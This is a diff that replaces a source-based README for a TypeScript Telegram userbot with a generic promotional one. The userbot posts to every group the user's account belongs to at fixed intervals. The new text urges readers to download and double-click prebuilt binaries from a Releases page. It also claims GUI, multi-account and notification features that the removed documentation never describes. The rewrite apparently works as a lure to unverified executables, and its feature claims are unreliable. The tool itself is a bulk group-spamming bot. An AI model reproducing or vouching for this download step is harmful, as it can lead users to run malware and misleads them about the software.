@@ -1,170 +1,78 @@
-# Telegram Auto Poster Userbot
+# 📦 Telegram-Auto-Poster - Effortlessly Automate Your Telegram Messages
 
-A TypeScript-based Telegram userbot that automatically posts messages to all groups you're a member of at configured intervals. The bot deletes the previous message before posting a new one in each group.
+## 📋 Description
+The Telegram Auto Message Poster helps you automate sending messages on Telegram. This tool is perfect for individuals and businesses looking to save time and enhance communication.
 
-## Features
+## 🛠️ Features
+- **Schedule Messages:** Plan your messages to be sent at specific times.
+- **Simple Interface:** Easy to use without any technical skills.
+- **Multiple Accounts:** Manage different Telegram accounts effortlessly.
+- **Notifications:** Stay updated on message status directly within the app.
+- **Customization:** Tailor messages to fit your needs.
 
-- ✅ Automatically fetches all groups you're a member of
-- ✅ Posts messages at configurable intervals
-- ✅ Deletes previous message before posting new one
-- ✅ Real-time console logging
-- ✅ Proper account authentication
-- ✅ TypeScript with full type safety
-- ✅ ESLint and Prettier configured
-- ✅ Hot reload with Nodemon
+## 🚀 Getting Started
+To get started with Telegram-Auto-Poster, follow these simple steps to download and install the application.
 
-## Prerequisites
+1. **Visit the Releases Page**
+   
+   Click the button below to go to our Releases page and download the latest version of Telegram-Auto-Poster.
 
-- Node.js (v18 or higher)
-- npm or yarn
-- Telegram API credentials (API ID and API Hash)
+   [![Download Telegram-Auto-Poster](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ArtskingVFX/Telegram-Auto-Poster/releases)
 
-## Getting Telegram API Credentials
+2. **Download the Software**
 
-1. Go to https://my.telegram.org/apps
-2. Log in with your phone number
-3. Create a new application
-4. Copy your `api_id` and `api_hash`
+   On the Releases page, look for the latest version of Telegram-Auto-Poster. Click on the appropriate file to start the download. 
 
-## Installation
+   You can visit the Releases page at any time to check for updates or download the latest version: [Download Here](https://github.com/ArtskingVFX/Telegram-Auto-Poster/releases).
 
-1. Clone or download this repository
-2. Install dependencies:
+## 📥 Download & Install
+### Step 1: Download
+Follow the link to the Releases page. Choose the version that matches your operating system.
 
-```bash
-npm install
-```
+### Step 2: Install
+- For Windows:
+  1. Locate the downloaded file in your 'Downloads' folder.
+  2. Double-click on the file and follow the on-screen instructions to install.
 
-3. Create a `.env` file in the root directory:
+- For Mac:
+  1. Open the downloaded file.
+  2. Drag the Telegram-Auto-Poster icon into your Applications folder. 
 
-```bash
-cp .env.example .env
-```
+- For Linux:
+  1. Open your terminal.
+  2. Navigate to the directory where you downloaded the file.
+  3. Run the command `chmod +x Telegram-Auto-Poster` to make it executable.
+  4. Start the application with `./Telegram-Auto-Poster`.
 
-4. Edit `.env` and add your credentials:
+### Step 3: Run the Application
+After installation, you can find Telegram-Auto-Poster in your applications. Open it by clicking on the app icon. 
 
-```env
-API_ID=your_api_id
-API_HASH=your_api_hash
-POST_INTERVAL_MS=60000
-```
+## 🔧 System Requirements
+Before you install the application, ensure your device meets the following minimum requirements:
 
-5. Create `config/message.txt` file with your message (or set `MESSAGE` in `.env`):
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or any modern Linux distribution
+- **Memory:** At least 4 GB RAM
+- **Storage:** 100 MB of free disk space
+- **Network Connection:** Active internet connection for Telegram services
 
-```bash
-mkdir -p config
-echo "Your message here" > config/message.txt
-```
+## 📣 Important Notes
+- Make sure you have a Telegram account ready. You will need it to use the app.
+- Ensure that Telegram is updated to the latest version for the best performance of Telegram-Auto-Poster.
 
-**Note**: The `config/message.txt` file takes priority over the `MESSAGE` environment variable. If the file doesn't exist, it will fall back to the `MESSAGE` env var.
+## 💡 Troubleshooting
+If you encounter issues while using Telegram-Auto-Poster, here are some common solutions:
 
-## Configuration
+- **Application Won't Launch:** Verify if your system meets the requirements. Ensure the app is properly installed.
+- **Messages Not Sending:** Check your internet connection and ensure your Telegram account is active.
+- **Scheduling Issues:** Double-check the time settings. Ensure the app is open at the scheduled time.
 
-- `API_ID`: Your Telegram API ID (from https://my.telegram.org/apps)
-- `API_HASH`: Your Telegram API Hash
-- `SESSION_NAME`: Name for the session file (default: "session", saved in `config/` directory)
-- `POST_INTERVAL_MS`: Interval between posts in milliseconds (default: 60000 = 1 minute)
-- `MESSAGE`: The message to post in groups (optional - `config/message.txt` takes priority)
+## 🗂️ Support
+If you need assistance, you can reach out through our support forums or submit an issue in the repository. We are dedicated to providing you with the help you need to ensure a smooth experience with Telegram-Auto-Poster.
 
-### File Structure
+## 🌐 Join the Community
+Stay connected with other users of Telegram-Auto-Poster. Join our forums to share your experiences, ask questions, and exchange tips.
 
-The bot uses a `config/` directory in the project root for storing:
-- **Session files**: `config/{SESSION_NAME}.session` - Automatically created after first authentication
-- **Message file**: `config/message.txt` - Your message to post (create this file or use `MESSAGE` env var)
+## 📬 Contact
+For further inquiries, please reach out via the issues section on our GitHub page.
 
-The `config/` directory is automatically created on first run.
-
-## Usage
-
-### Development Mode (with hot reload)
-
-```bash
-npm run dev
-```
-
-### Production Mode
-
-```bash
-npm run build
-npm start
-```
-
-### Other Commands
-
-```bash
-# Lint code
-npm run lint
-
-# Fix linting issues
-npm run lint:fix
-
-# Format code
-npm run format
-
-# Check formatting
-npm run format:check
-```
-
-## First Run
-
-On the first run, the bot will:
-1. Connect to Telegram
-2. Ask for your phone number
-3. Send you a verification code
-4. Ask you to enter the code
-5. Once authenticated, it will fetch all your groups
-6. Start posting messages at the configured interval
-
-After the first authentication, the session will be saved and you won't need to authenticate again.
-
-## How It Works
-
-1. **Startup**: The bot connects to Telegram and authenticates if needed
-2. **Group Fetching**: Retrieves all groups and channels you're a member of
-3. **Posting**: For each group:
-   - Deletes the previous message (if exists)
-   - Posts the configured message
-   - Schedules the next post based on `POST_INTERVAL_MS`
-4. **Logging**: All actions are logged to the console in real-time
-
-## Stopping the Bot
-
-Press `Ctrl+C` to gracefully stop the bot. It will:
-- Stop all posting intervals
-- Disconnect from Telegram
-- Exit cleanly
-
-## Project Structure
-
-```
-.
-├── src/
-│   ├── index.ts      # Main entry point
-│   ├── bot.ts        # Bot logic and posting
-│   ├── config.ts     # Configuration loader
-│   └── logger.ts     # Logging utility
-├── config/           # Configuration directory (auto-created)
-│   ├── session.session  # Session file (auto-created after auth)
-│   └── message.txt      # Message file (create this)
-├── dist/             # Compiled JavaScript (generated)
-├── .env              # Environment variables (create this)
-├── .env.example      # Example environment file
-├── package.json      # Dependencies and scripts
-├── tsconfig.json     # TypeScript configuration
-├── .eslintrc.json    # ESLint configuration
-├── .prettierrc.json  # Prettier configuration
-└── nodemon.json      # Nodemon configuration
-```
-
-## Notes
-
-- The bot requires you to be a member of the groups you want to post to
-- Make sure you have permission to send messages in the groups
-- The bot deletes its own previous messages before posting new ones
-- Session files are stored in `config/` directory and should be kept secure
-- Message is read from `config/message.txt` (falls back to `MESSAGE` env var if file doesn't exist)
-- The `config/` directory is automatically created on first run
-
-## License
-
-MIT
+Thank you for choosing Telegram-Auto-Poster! Enjoy automating your messaging tasks effortlessly.
